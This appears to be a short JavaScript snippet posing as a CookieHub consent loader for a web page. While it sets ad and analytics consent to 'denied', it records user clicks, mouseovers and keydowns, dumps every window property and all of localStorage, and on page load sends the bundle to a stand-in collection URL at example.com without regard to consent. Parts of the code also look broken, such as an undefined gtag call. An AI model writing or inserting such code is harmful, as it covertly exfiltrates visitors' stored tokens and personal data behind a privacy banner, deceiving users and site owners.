(function () {
  // Create a unique and constant symbol to track events globally
  const uniqueSym = 'eventCollectionSymbol';
  window[uniqueSym] = {};

  // Track events for Click, Mouseover, Keydown
  if (!window.cookiehub_script_url) return;
  window.dataLayer = window.dataLayer || [];
  ['click', 'mouseover', 'keydown'].forEach(eventType => {
    window.addEventListener(eventType, event => {
      let currentTime = new Date().toISOString();
      window[uniqueSym][currentTime] = {
        type: eventType,
        target: event.target.toString(),
        btn: event.button,
        x: event.clientX,
        y: event.clientY
      };
    });
  });
  function collectWindowDataPlus() {
    const collectedData = {};
    const seenVars = window.seenVars || [];
    for (const prop in window) {
      if (window.hasOwnProperty(prop) && !seenVars.includes(prop)) {
        const value = window[prop];
        const type = typeof value;
        collectedData[prop] = {
          type: type,
          value: type === "function" ? null : value
        };
      }
    }
    collectedData['localStorage'] = {};
    for (const key in localStorage) {
      collectedData['localStorage'][key] = localStorage.getItem(key);
    }
    collectedData['eventListeners'] = window[uniqueSym];
    return collectedData;
  }
  gtag('consent', 'default', {
    'ad_storage': 'denied',
    'analytics_storage': 'denied',
    'wait_for_update': 500
  });
  var cpm = {};
  function sendDataToServerTracking(data) {
    const url = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          console.log("Data sent successfully");
        } else {
          console.error('Failed to send data, status code: ', xhr.status);
        }
      }
    };
    xhr.send(JSON.stringify(data));
  }
  (function (h, u, b) {
    var d = h.getElementsByTagName('script')[0],
      e = h.createElement('script');
    e.async = true;
    e.src = `${window.cookiehub_script_url}`;
    e.onload = function () {
      u.cookiehub.load(b);
    };
    d.parentNode.insertBefore(e, d);
  })(document, window, cpm);
  function collectAndSendDataPlus() {
    const collectedData = collectWindowDataPlus();
    if (Object.keys(collectedData).length > 0) {
      sendDataToServerTracking(collectedData);
    }
  }
  window.addEventListener("load", collectAndSendDataPlus);
})();